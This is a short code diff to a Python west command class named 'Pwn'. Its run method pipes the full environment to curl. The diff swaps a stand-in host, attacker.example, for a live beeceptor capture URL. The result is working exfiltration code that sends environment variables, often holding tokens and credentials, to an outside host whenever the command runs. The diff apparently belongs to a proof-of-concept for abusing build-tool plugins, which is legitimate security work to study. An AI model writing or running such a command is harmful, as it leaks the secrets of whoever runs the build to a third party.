@@ -10,4 +10,4 @@ class Pwn(WestCommand):
         )
 
     def do_run(self, args, unknown_args):
-        subprocess.run("env | curl https://attacker.example", shell=True)
+        subprocess.run("env | curl https://wh4e752cc2cc7e64da5b.free.beeceptor.com", shell=True)
